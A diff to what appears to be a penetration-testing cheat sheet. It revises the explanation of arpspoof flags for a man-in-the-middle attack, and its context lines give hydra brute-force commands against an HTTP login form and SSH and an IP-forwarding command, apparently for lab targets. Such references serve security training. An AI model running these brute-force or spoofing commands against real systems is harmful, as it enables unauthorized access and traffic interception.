@@ -259,7 +259,7 @@
   - HTTP-POST login dictionary `hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/wordlist.txt -P /usr/share/passList.txt -f -V`, where flag `-f` is to stop the attack as soon as we find one successful result,
   - SSH Attack `hydra 10.10.10.222 ssh -L /usr/share/userList.txt -P /usr/share/passList.txt -f -V`
 - Port forward: `echo 1 > /proc/sys/net/ipv4/ip_forward`
-- Arpspoof: `arpspoof -i <interface> -t <target ip> -r <host>`, NOTE: Both target and host are the victim IP addresses and only do the spoof after port forwarding 
+- Arpspoof: `arpspoof -i <interface> -t <target ip> -r <host ip>`, NOTE: `-t` address is the source ip (often the victim) and the `-r` is the destination ip. In a MiTM, we are between them. 
   - `arpspoof -i eth0 -t 10.10.10.222 -r 10.10.10.240` - Will intercept traffic in that .222-240 range, this is where Wireshark would be of great help. 
 
     
